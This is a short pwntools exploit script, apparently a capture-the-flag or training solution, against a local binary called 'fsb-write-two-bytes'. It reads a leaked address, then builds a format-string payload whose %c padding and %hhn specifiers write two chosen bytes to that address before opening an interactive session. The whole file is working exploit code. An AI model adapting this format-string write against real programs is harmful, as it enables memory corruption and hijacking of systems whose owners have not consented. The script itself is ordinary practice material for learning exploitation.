#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-two-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

diff_hnn = lambda i, j: ((i - j) % 256)

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

start = 9
payload = f"%{0x37}c%{start}$hhn".encode()
payload += f"%{diff_hnn(0x13, 0x37)}c%{start+1}$hhn".encode()
payload += b"||"

payload += p64(secret)
payload += p64(secret+1)

io.sendline(payload)

io.interactive()
